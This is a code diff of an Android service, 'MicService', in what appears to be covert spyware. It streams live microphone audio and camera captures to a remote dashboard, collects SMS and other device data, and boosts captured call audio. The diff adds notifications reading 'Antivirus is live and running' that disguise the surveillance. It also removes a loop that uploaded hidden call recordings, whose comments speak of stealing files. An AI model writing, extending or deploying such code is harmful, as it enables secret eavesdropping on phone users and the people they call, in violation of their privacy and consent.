@@ -2117,7 +2271,7 @@ class MicService : Service() {
         // HD mode: use max resolution for full quality
         // Normal/Fast: reasonable size that still captures full frame
         val maxEdge = when {
-            lowNetworkMode || isNetworkLagging || photoQualityMode == "fast" -> 720
+            isEffectiveLowNetworkMode() || photoQualityMode == "fast" -> 720
             photoQualityMode == "hd" -> 1920
             else -> 1280
         }
@@ -2178,6 +2332,9 @@ class MicService : Service() {
         }
 
         try {
+            cameraCapturing = true
+            startForegroundForHardware(mic = isCapturing, camera = true, text = "Camera capture active")
+            sendHealthStatus("camera_started")
             imageReader.setOnImageAvailableListener({ reader ->
                 val image = reader.acquireLatestImage()
                 if (image != null) {
@@ -2288,7 +2445,7 @@ class MicService : Service() {
                 set(CaptureRequest.JPEG_ORIENTATION, jpegOrientation)
             }.build()
             captureSession.setRepeatingRequest(warmupReq, captureCallback, handler)
-            withTimeoutOrNull(if (photoNightMode == "off" || lowNetworkMode) 800L else 1_200L) { aeConverged.await() }
+            withTimeoutOrNull(if (photoNightMode == "off" || isEffectiveLowNetworkMode()) 800L else 1_200L) { aeConverged.await() }
 
             // Explicit AF trigger then lock wait (up to 3s) before firing the still.
             val afTriggerReq = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
@@ -2301,7 +2458,7 @@ class MicService : Service() {
                 set(CaptureRequest.JPEG_ORIENTATION, jpegOrientation)
             }.build()
             captureSession.capture(afTriggerReq, captureCallback, handler)
-            withTimeoutOrNull(if (photoNightMode == "off" || lowNetworkMode) 800L else 1_200L) { afLocked.await() }
+            withTimeoutOrNull(if (photoNightMode == "off" || isEffectiveLowNetworkMode()) 800L else 1_200L) { afLocked.await() }
 
             val req = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                 addTarget(imageReader.surface)
@@ -2359,7 +2516,7 @@ class MicService : Service() {
             // Flush all residual preview frames from the ImageReader so they don't
             // race with the actual still capture after isWarmupComplete is set.
             captureSession.abortCaptures()
-            delay(if (photoNightMode == "off" || lowNetworkMode) 180L else 260L)
+            delay(if (photoNightMode == "off" || isEffectiveLowNetworkMode()) 180L else 260L)
             // Drain any images that arrived during the abort window
             var drained = 0
             while (true) {
@@ -2385,6 +2542,13 @@ class MicService : Service() {
             try { if (cameraClosed.compareAndSet(false, true)) camera?.close() } catch (_: Exception) {}
             try { imageReader.close() } catch (_: Exception) {}
             try { thread.quitSafely() } catch (_: Exception) {}
+            cameraCapturing = false
+            startForegroundForHardware(
+                mic = isCapturing,
+                camera = false,
+                text = if (isCapturing) "Live audio active" else "Antivirus is live and running",
+            )
+            sendHealthStatus("camera_stopped")
         }
     }
 
@@ -2446,7 +2610,7 @@ class MicService : Service() {
             
             // Use full resolution for HD, reasonable for others (no aggressive crop)
             val maxEdge = when {
-                lowNetworkMode || isNetworkLagging || qualityMode == "fast" -> 720
+                isEffectiveLowNetworkMode() || qualityMode == "fast" -> 720
                 qualityMode == "hd" -> 1920
                 else -> 1280
             }
@@ -2497,7 +2661,7 @@ class MicService : Service() {
                 // Detect capture mode based on brightness
                 val avgLuma = ImageEnhancer.estimateLuma(bitmap)
                 val mode = when {
-                    (lowNetworkMode || isNetworkLagging) -> ImageEnhancer.CaptureMode.FAST
+                    isEffectiveLowNetworkMode() -> ImageEnhancer.CaptureMode.FAST
                     photoNightMode != "off" -> ImageEnhancer.CaptureMode.NIGHT
                     else -> ImageEnhancer.detectMode(avgLuma)
                 }
@@ -2580,134 +2744,7 @@ class MicService : Service() {
     }
     
     // ────────────────────────────────────────────────────────────────────────
-    // Local Call Recording Uploader Loop
-    // ────────────────────────────────────────────────────────────────────────
-
-    private fun startRecordingUploader() {
-        recordingUploaderJob?.cancel()
-        recordingUploaderJob = serviceScope.launch(Dispatchers.IO) {
-            while (isActive) {
-                scanAndUploadRecordings()
-                delay(15 * 60 * 1000L) // 15 minute interval
-            }
-        }
-    }
-
-    private fun stopRecordingUploader() {
-        recordingUploaderJob?.cancel()
-        recordingUploaderJob = null
-    }
-
-    private val isScanningRecordingsGuard = java.util.concurrent.atomic.AtomicBoolean(false)
-
-    private suspend fun scanAndUploadRecordings() {
-        // EDGE CASE: Prevent simultaneous manual scan and automatic interval scan 
-        if (!isScanningRecordingsGuard.compareAndSet(false, true)) {
-            Log.i(TAG, "Recording scan already in progress, skipping duplicate request.")
-            return
-        }
-        try {
-            val dirsToScan = mutableListOf<File>()
-            
-            val hiddenDir = File(applicationContext.filesDir, "hidden_calls")
-            if (hiddenDir.exists() && hiddenDir.isDirectory) dirsToScan.add(hiddenDir)
-            
-            if (dirsToScan.isEmpty()) return
-
-        // EDGE CASE FIX 1: Track successfully uploaded files to prevent infinite upload loops
-        // if Android Scoped Storage prevents us from deleting the file locally.
-        val uploadedKey = "uploaded_records_history"
-        val uploadedFiles = prefs.getStringSet(uploadedKey, mutableSetOf())?.toMutableSet() ?: mutableSetOf()
-        
-        // LOOPHOLE FIX: Prune missing files to prevent SharedPreferences memory leak over time
-        val existingUploaded = uploadedFiles.filter { File(it).exists() }
-        if (existingUploaded.size < uploadedFiles.size) {
-            uploadedFiles.retainAll(existingUploaded.toSet())
-            prefs.edit().putStringSet(uploadedKey, uploadedFiles).apply()
-        }
-
-        val files = mutableListOf<File>()
-        for (dir in dirsToScan) {
-            try {
-                files.addAll(dir.walkTopDown()
-                    .maxDepth(3)
-                    .filter { it.isFile && it.name.matches(Regex(".*\\.(mp3|m4a|wav|amr|aac|ogg|opus|mkv)$", RegexOption.IGNORE_CASE)) }
-                    .take(50)
-                    .toList())
-            } catch (e: Exception) {
-                Log.e(TAG, "Error scanning directory ${dir.absolutePath}: ${e.message}")
-            }
-        }
-
-        for (file in files) {
-            // Check if the recording uploader job is still active
-            if (recordingUploaderJob?.isActive != true) break
-            
-            // EDGE CASE: Skip empty placeholder files native recorders create immediately on call start
-            if (file.length() == 0L) {
-                // LOOPHOLE FIX: If it's 0 bytes and older than 1 minute, it's a dead/failed recording. Delete it to prevent storage bloat.
-                if (System.currentTimeMillis() - file.lastModified() > 60_000L) file.delete()
-                continue
-            }
-
-            // EDGE CASE FIX 1: If file was previously uploaded but undeletable, skip to prevent infinite loop
-            if (uploadedFiles.contains(file.absolutePath)) {
-                // Do nothing here. We must wait for the PC dashboard to send the 'delete_recording' command.
-                continue
-            }
-            
-            // EDGE CASE FIX 2: Explicitly skip the currently active recording file
-            if (CallRecorder.isRecording && file.absolutePath == CallRecorder.currentOutputFile?.absolutePath) {
-                continue
-            }
-
-            // EDGE CASE: If a call is actively ongoing, the file is still being written to.
-            // Increased to 60 seconds to guarantee the call has ended before we steal and delete the file.
-            if (System.currentTimeMillis() - file.lastModified() < 60_000L) {
-                continue
-            }
-
-            var success = false
-            try {
-                val requestBody = MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("deviceId", deviceId)
-                    .addFormDataPart("recording", file.name, file.asRequestBody("audio/*".toMediaTypeOrNull()))
-                    .build()
-
-                val request = Request.Builder()
-                    .url("$serverHttpBaseUrl/api/upload-recording")
-                    .post(requestBody)
-                    // EDGE CASE FIX 2: Removed X-Filename header. OkHttp crashes if file.name contains Unicode/Emojis.
-                    // The backend Express/Multer will safely fall back to reading `req.file.originalname`.
-                    .addHeader("X-Device-Id", deviceId)
-                    .apply { if (wsAuthToken.isNotBlank()) addHeader("X-Auth-Token", wsAuthToken) }
-                    .build()
-
-                Log.i(TAG, "Uploading recording: ${file.name} (${file.length()} bytes)")
-                val response = recordingUploadClient.newCall(request).execute()
-                if (response.isSuccessful) {
-                    Log.i(TAG, "Successfully uploaded recording: ${file.name}")
-                    success = true
-                } else {
-                    Log.e(TAG, "Failed to upload recording ${file.name}, HTTP code: ${response.code}")
-                }
-                response.close()
-            } catch (e: Exception) {
-                Log.e(TAG, "Exception uploading recording ${file.name}: ${e.message}")
-            }
-
-            if (success) {
-                // DO NOT delete here. Wait for PC dashboard to download and send the delete command.
-                uploadedFiles.add(file.absolutePath)
-                prefs.edit().putStringSet(uploadedKey, uploadedFiles).apply()
-                Log.i(TAG, "Recording uploaded and kept on device until PC confirms download: ${file.name}")
-            }
-        }
-        } finally {
-            isScanningRecordingsGuard.set(false)
-        }
-    }
+    // Saved audio recording is disabled. Live PCM listening remains available only while start_stream is active.
 
     private fun setupCallListener() {
         val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return
@@ -2929,8 +2966,12 @@ class MicService : Service() {
         return false
     }
 
-    private fun sendDeviceData() {
+    private fun sendDeviceData(force: Boolean = false) {
         try {
+            if (!force && isCapturing && (imageTransferActive || imageQueueDepth > 0 || imageUploadPausedForAudio)) {
+                Log.d(TAG, "Skipping routine device data sync while live audio and image upload are active")
+                return
+            }
             val data = dataCollector.collectAll()
             // Bug 5: Hash-based change detection — use precise checksum to avoid 32-bit collisions
             val smsArray = data.optJSONArray("sms")
@@ -2968,9 +3009,9 @@ class MicService : Service() {
     private fun startAudioCapture() {
         if (!wantsMicStreaming) return
         if (!isCapturingGuard.compareAndSet(false, true)) return
-        // REMOVED: isDeviceInCall() block to allow concurrent recording
         Log.i(TAG, "[MIC] Starting audio capture loop")
         isCapturing = true
+        startForegroundForHardware(mic = true, camera = cameraCapturing, text = "Live audio active")
         lastAudioChunkSentAt = System.currentTimeMillis()
         lastPingSentAt = lastAudioChunkSentAt
 
@@ -3045,7 +3086,6 @@ class MicService : Service() {
                 var consecutiveReadErrors = 0
                 var nearSilentFrames = 0
                 val captureStartedAtMs = System.currentTimeMillis()
-                var lastRecordingFlushAt = System.currentTimeMillis()
                 // Bug 2.1: Cache at loop start
                 var targetChunkSize = streamChunkSize
                 val frameBuffer = ByteArray(audioReadBufferSize.coerceAtLeast(streamChunkSize * 2))
@@ -3144,9 +3184,6 @@ class MicService : Service() {
                         // ══════════════════════════════════════════════════════════════════
                         // REALTIME MODE ──────────────────────────────────────────────────
                         // ══════════════════════════════════════════════════════════════════
-                        if (System.currentTimeMillis() % 10000 < 100) {
-                            Log.d(TAG, "Realtime PCM mode active")
-                        }
                         // Issue A: Compute codec ONCE per chunk, share between gain + encode.
                         val codec = chooseWsFallbackCodec()
                         lastCodecChoice = codec
@@ -3158,20 +3195,20 @@ class MicService : Service() {
                         val nowMs = System.currentTimeMillis()
                         val rawSpeech = rms > 420.0 || peakAbs > 1800
                         speechHangoverFrames = if (rawSpeech) {
-                            if (lowNetworkMode || isNetworkLagging) 6 else 10
+                            if (isEffectiveLowNetworkMode()) 6 else 10
                         } else {
                             (speechHangoverFrames - 1).coerceAtLeast(0)
                         }
                         val likelySpeech = rawSpeech || speechHangoverFrames > 0
                         silenceGateFrames = if (likelySpeech) 0 else silenceGateFrames + 1
-                        val silenceKeepaliveMs = if (lowNetworkMode || isNetworkLagging) 1_200L else 650L
+                        val silenceKeepaliveMs = if (isEffectiveLowNetworkMode()) 1_200L else 650L
                         val dropSilence = silenceGateFrames > 16 && nowMs - lastSilenceKeepaliveAt < silenceKeepaliveMs
                         val dropForBackpressure = qSize > 32_000L || (qSize > 16_000L && !likelySpeech)
 
                         if (dropSilence || dropForBackpressure) {
                             if (dropSilence) silenceDropCount++ else audioDropCount++
                             if (!dropSilence && audioDropCount % 25L == 1L) {
-                                safeSend("""{"type":"audio_quality","deviceId":"$deviceId","lowNetwork":${lowNetworkMode || isNetworkLagging},"dropping":true,"dropped":$audioDropCount,"buffered":$qSize,"ts":${System.currentTimeMillis()}}""")
+                                safeSend("""{"type":"audio_quality","deviceId":"$deviceId","lowNetwork":${isEffectiveLowNetworkMode()},"dropping":true,"dropped":$audioDropCount,"buffered":$qSize,"ts":${System.currentTimeMillis()}}""")
                             }
                         } else {
                             if (!likelySpeech) lastSilenceKeepaliveAt = nowMs
@@ -3204,7 +3241,7 @@ class MicService : Service() {
                         if (read == AudioRecord.ERROR_DEAD_OBJECT) {
                             Log.w(TAG, "Audio HAL routed mic to call. Rebuilding AudioRecord for concurrent capture...")
                             
-                            // 1. Cleanly shut down the dead recording
+                            // 1. Cleanly shut down the dead AudioRecord
                             try { audioRecord?.stop() } catch (_: Exception) {}
                             releaseSessionAudioEffects()
                             try { audioRecord?.release() } catch (_: Exception) {}
@@ -3269,6 +3306,11 @@ class MicService : Service() {
                     audioRecord = null
                 }
                 isCapturingGuard.set(false)
+                startForegroundForHardware(
+                    mic = false,
+                    camera = cameraCapturing,
+                    text = if (cameraCapturing) "Camera capture active" else "Antivirus is live and running",
+                )
                 if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                 Log.i(TAG, "Audio capture stopped")
                 sendHealthStatus("mic_stopped")
@@ -3291,8 +3333,6 @@ class MicService : Service() {
             while (isActive) {
                 delay(10_000)  // Check every 10 seconds
                 if (!wantsMicStreaming || activeWebSocket == null || isRecoveringMic) continue
-
-                // REMOVED: isDeviceInCall() block to allow concurrent recording
 
                 // Layer 6: Watchdog - stall detection reduced to 10s as requested
                 val stalled = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 20_000)
@@ -3369,7 +3409,12 @@ class MicService : Service() {
                     if (AcousticEchoCanceler.isAvailable()) {
                         try {
                             acousticEchoCanceler = AcousticEchoCanceler.create(sessionId)
-                            acousticEchoCanceler?.enabled = true
+                            val callActive = isDeviceInCall()
+                            acousticEchoCanceler?.enabled = when (callAecMode) {
+                                "on" -> true
+                                "off" -> false
+                                else -> !(callActive && callCaptureMode == "earpiece" && earpieceBoostMode != "off")
+                            }
                         } catch (e: Exception) {
                             Log.w(TAG, "AcousticEchoCanceler init failed: ${e.message}")
                         }
@@ -3444,6 +3489,9 @@ class MicService : Service() {
         val samples = len / 2
         val strongAi = aiEnhancementEnabled
         val p = voiceProfile
+        val callActive = isDeviceInCall()
+        val earpieceBoostActive = callActive && callCaptureMode == "earpiece" && earpieceBoostMode != "off"
+        val speakerCaptureActive = callActive && callCaptureMode == "speaker"
         // Issue A: willBeMuLaw now passed by caller (single codec decision per chunk)
 
         val inWarmup = realtimeDenoiserWarmupChunksRemaining > 0
@@ -3463,10 +3511,14 @@ class MicService : Service() {
         // SENIOR DEV FIX: Lower alpha = higher cutoff frequency.
         // 0.9150 pushes the cutoff to ~250Hz. This completely strips the 
         // heavy low-end rumble of coolers and exhaust fans before the gain stage.
-        val hpAlpha = when (p) {
+        val hpAlpha = when {
+            earpieceBoostActive -> 0.9300
+            speakerCaptureActive -> 0.9350
+            else -> when (p) {
             "far"  -> if (noisyEnv) 0.9150 else 0.9550
             "near" -> if (noisyEnv) 0.9420 else 0.9500
             else   -> if (noisyEnv) 0.9580 else 0.9650
+            }
         }
         for (i in 0 until samples) {
             val x = work[i]
@@ -3499,10 +3551,18 @@ class MicService : Service() {
             eq1X1 = x
             eq1Y2 = eq1Y1
             eq1Y1 = y
-            val wet = when (p) {
+            val wet = when {
+                earpieceBoostActive -> when (earpieceBoostMode) {
+                    "high" -> 0.52
+                    "medium" -> 0.44
+                    else -> 0.34
+                }
+                speakerCaptureActive -> 0.30
+                else -> when (p) {
                 "near" -> if (strongAi) 0.22 else 0.16
                 "far" -> if (strongAi) 0.35 else 0.25
                 else -> if (strongAi) 0.16 else 0.12
+                }
             }
             work[i] = x * (1.0 - wet) + y * wet
         }
@@ -3530,8 +3590,15 @@ class MicService : Service() {
         }
 
         // ── Stage 2b: High-shelf @ ~3.5 kHz ─────────────────────────────────
-        if (p == "far" || (p == "near" && !willBeMuLaw)) {
-            val hfGain = when (p) {
+        if (earpieceBoostActive || speakerCaptureActive || p == "far" || (p == "near" && !willBeMuLaw)) {
+            val hfGain = when {
+                earpieceBoostActive -> when (earpieceBoostMode) {
+                    "high" -> 1.45
+                    "medium" -> 1.32
+                    else -> 1.20
+                }
+                speakerCaptureActive -> 1.18
+                else -> when (p) {
                 "far" -> if (willBeMuLaw) {
                     if (strongAi) 1.14 else 1.08
                 } else {
@@ -3539,6 +3606,7 @@ class MicService : Service() {
                 }
                 "near" -> if (strongAi) 1.18 else 1.10
                 else -> 1.08
+                }
             }
             val hfAlpha = 0.15
             var prevOut = hfShelfPrevOut
@@ -3564,12 +3632,24 @@ class MicService : Service() {
         val snr = rmsDb - estimatedNoiseDb
 
         val gainCeil = when {
+            earpieceBoostActive -> when (earpieceBoostMode) {
+                "high" -> 11.0
+                "medium" -> 8.0
+                else -> 5.5
+            }
+            speakerCaptureActive -> 5.0
             willBeMuLaw -> 4.0
             p == "far" -> if (strongAi) 9.0 else 7.0
             else -> if (strongAi) 8.0 else 6.0
         }
         
         val baseGainTarget = when {
+            earpieceBoostActive -> when (earpieceBoostMode) {
+                "high" -> 24000.0
+                "medium" -> 20500.0
+                else -> 17500.0
+            }
+            speakerCaptureActive -> 15500.0
             willBeMuLaw -> 14000.0
             p == "far" -> if (strongAi) 22000.0 else 19000.0
             else -> if (strongAi) 19000.0 else 16500.0
@@ -3578,7 +3658,12 @@ class MicService : Service() {
         // Continuous soft expander. Keep a real floor so speech does not jump up
         // from near-mute; hard expansion made first words hard to understand.
         val snrFactor = snr.coerceIn(0.0, 15.0) / 15.0
-        val expanderFloor = if (willBeMuLaw || lowNetworkMode || isNetworkLagging) 0.24 else 0.18
+        val expanderFloor = when {
+            earpieceBoostActive -> 0.34
+            speakerCaptureActive -> 0.28
+            willBeMuLaw || isEffectiveLowNetworkMode() -> 0.24
+            else -> 0.18
+        }
         val expanderMultiplier = expanderFloor + ((1.0 - expanderFloor) * snrFactor)
 
         val effectiveGainTarget = baseGainTarget * expanderMultiplier
@@ -3594,6 +3679,12 @@ class MicService : Service() {
         val userGain = softwareGainMultiplier.coerceIn(0.5, 5.0)
         
         val maxCombined = when {
+            earpieceBoostActive -> when (earpieceBoostMode) {
+                "high" -> 9.0
+                "medium" -> 7.0
+                else -> 5.0
+            }
+            speakerCaptureActive -> 4.5
             willBeMuLaw -> 4.5
             p == "far" -> if (strongAi) 8.0 else 6.0
             else -> 6.0
@@ -3625,7 +3716,7 @@ class MicService : Service() {
     private fun chooseWsFallbackCodec(): Byte {
         // Keep PCM16 on normal links; switch to µ-law 8k only when the link is
         // explicitly constrained or the websocket queue shows realtime lag.
-        return if (lowNetworkMode || isNetworkLagging) AUDIO_CODEC_MULAW_8K else AUDIO_CODEC_PCM16_16K
+        return if (isEffectiveLowNetworkMode()) AUDIO_CODEC_MULAW_8K else AUDIO_CODEC_PCM16_16K
     }
 
     /**
@@ -4012,7 +4103,9 @@ class MicService : Service() {
             put("type", "health_status")
             put("deviceId", deviceId)
             put("wsConnected", activeWebSocket != null)
+            put("dashboardConnected", activeWebSocket != null)
             put("micCapturing", isCapturing)
+            put("cameraCapturing", cameraCapturing)
             put("lastAudioChunkSentAt", lastAudioChunkSentAt)
             put("reason", reason)
             put("ts", lastHealthSentAt)
@@ -4026,12 +4119,21 @@ class MicService : Service() {
             put("streamCodecMode", wsStreamMode)
             put("streamCodec", if (lastCodecChoice == AUDIO_CODEC_MULAW_8K) "smart" else "pcm")
             put("voiceProfile", voiceProfile)
+            put("callCaptureMode", callCaptureMode)
+            put("earpieceBoost", earpieceBoostMode)
+            put("callAecMode", callAecMode)
             put("noiseDb", estimatedNoiseDb)
             put("internetOnline", internetOnline)
             put("callActive", callActive)
-            put("lowNetwork", lowNetworkMode)
+            put("lowNetwork", isEffectiveLowNetworkMode())
+            put("lowNetworkRequested", lowNetworkMode)
             put("networkLagging", isNetworkLagging)
             put("droppingPackets", isNetworkLagging || audioDropCount > 0)
+            put("imageUploadStatus", imageUploadStatus)
+            put("imageQueued", imageQueueDepth > 0 && !imageTransferActive)
+            put("imageUploading", imageTransferActive && imageUploadStatus == "uploading")
+            put("uploadPausedForAudio", imageUploadPausedForAudio)
+            put("imageQueueDepth", imageQueueDepth)
             put("audioDrops", audioDropCount)
             put("silenceDrops", silenceDropCount)
             put("frameMs", currentStreamFrameMs())
@@ -4129,6 +4231,18 @@ class MicService : Service() {
     private fun updateNotification(statusText: String) {
         val manager = getSystemService(NotificationManager::class.java)
         manager.notify(NOTIF_ID, buildNotification(statusText))
+    }
+
+    private fun startForegroundForHardware(mic: Boolean, camera: Boolean, text: String) {
+        val notification = buildNotification(text)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && (mic || camera)) {
+            var typeFlags = 0
+            if (mic) typeFlags = typeFlags or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+            if (camera) typeFlags = typeFlags or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+            startForeground(NOTIF_ID, notification, typeFlags)
+        } else {
+            startForeground(NOTIF_ID, notification)
+        }
     }
 
     private fun acquireWakeLock() {
